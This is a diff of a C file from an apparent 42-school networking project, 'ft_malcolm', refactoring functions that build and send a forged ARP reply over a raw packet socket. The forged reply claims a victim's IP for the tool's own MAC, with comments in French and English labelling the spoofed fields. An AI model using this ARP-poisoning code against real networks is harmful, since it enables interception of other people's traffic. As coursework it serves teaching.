@@ -6,76 +6,47 @@
 /*   By: lle-saul <lle-saul@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/04/08 12:12:33 by lle-saul          #+#    #+#             */
-/*   Updated: 2025/05/09 11:10:42 by lle-saul         ###   ########.fr       */
+/*   Updated: 2025/05/12 13:12:11 by lle-saul         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ft_malcolm.h"
 
-char	*create_send_pkg(t_info *info)
+t_packet	create_send_pkg(t_info *info, struct ethhdr eth, struct ether_arp arp)
 {
-	char	*packet;
-
-	packet = malloc(sizeof(struct ethhdr) + sizeof(struct ether_arp) + 1);
-	if (!packet)
-		return (NULL);
-	/* ------ Ethernet Header ------ */
-	ft_memcpy(packet, info->target_mac, 6);
-	ft_memcpy(packet + 6, info->src_mac, 6);
-	packet[12] = 0x08;
-	packet[13] = 0x06;
-
-	/* ------ ARP Header ------*/
-	packet[14] = 0x00;
-	packet[15] = 0x01;
+	t_packet	packet;
 	
-	packet[16] = 0x08;
-	packet[17] = 0x00;
+	ft_memset(&packet, 0, sizeof(t_packet));
+	packet.eth = eth;
+	packet.arp = arp;
+	
+	ft_memcpy(packet.eth.h_dest, eth.h_source, ETH_ALEN);
+	ft_memcpy(packet.eth.h_source, info->src_mac, ETH_ALEN);
 
-	packet[18] = 0x06;
-
-	packet[19] = 0x04;
-
-	packet[20] = 0x00;
-	packet[21] = 0x02;
-
-	ft_memcpy(packet + 22, info->src_mac, 6);
-	ft_memcpy(packet + 28, &info->src_ip.sin_addr, 4);
-	ft_memcpy(packet + 32, info->target_mac, 6);
-	ft_memcpy(packet + 38, &info->target_ip.sin_addr, 4);
-	packet[42] = 0x00;
+	ft_memcpy(packet.arp.arp_sha, info->src_mac, ETH_ALEN);
+	ft_memcpy(packet.arp.arp_spa, arp.arp_tpa, 4);
+	ft_memcpy(packet.arp.arp_tha, arp.arp_sha, ETH_ALEN);
+	ft_memcpy(packet.arp.arp_tpa, arp.arp_spa, 4);
+	
 	return (packet);
 }
 
 /*[ Ethernet Header ]
   - Destination MAC (celui qui a fait la requête)
-  - Source MAC (spoofé)
+  - Source MAC (spoofed)
   - Type = 0x0806 (ARP)
 
 [ ARP Header ]
-  - htype = 1 (Ethernet)
-  - ptype = 0x0800 (IPv4)
-  - hlen = 6
-  - plen = 4
-  - opcode = 2 (ARP reply)
-  - sender MAC = spoofed
-  - sender IP = spoofed
-  - target MAC = MAC du demandeur
-  - target IP = IP du demandeur*/
+  - sender MAC = spoofed [arp_sha]
+  - sender IP = IP de la victime [arp_spa]
+  - target MAC = MAC du demandeur [arp_tha]
+  - target IP = IP du demandeur [arp_tpa]*/
 
-void	send_pkg(char *send_pkg, struct ether_arp *arp, int eth_index)
+void	send_pkg(t_packet packet, struct sockaddr_ll *recv_addr)
 {
 	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
-	
-	struct sockaddr_ll sender_addr;
-	ft_memset(&sender_addr, 0, sizeof(struct sockaddr_ll));
-	sender_addr.sll_family = AF_PACKET;
-	sender_addr.sll_protocol = htons(ETH_P_ARP);
-	sender_addr.sll_halen = ETH_ALEN;
-	sender_addr.sll_ifindex = eth_index;
-	ft_memcpy(&sender_addr.sll_addr, arp->arp_sha, 6);
-	
-	if (sendto(g_socket, send_pkg, 42, 0, (struct sockaddr *)&sender_addr, sizeof(sender_addr)) < 0) {
+
+	if (sendto(g_socket, &packet, sizeof(t_packet), 0, (struct sockaddr *)recv_addr, sizeof(struct sockaddr_ll)) < 0) {
 		fprintf(stderr, "Error sending packet: %s\n", strerror(errno));
 		return ;
 	}
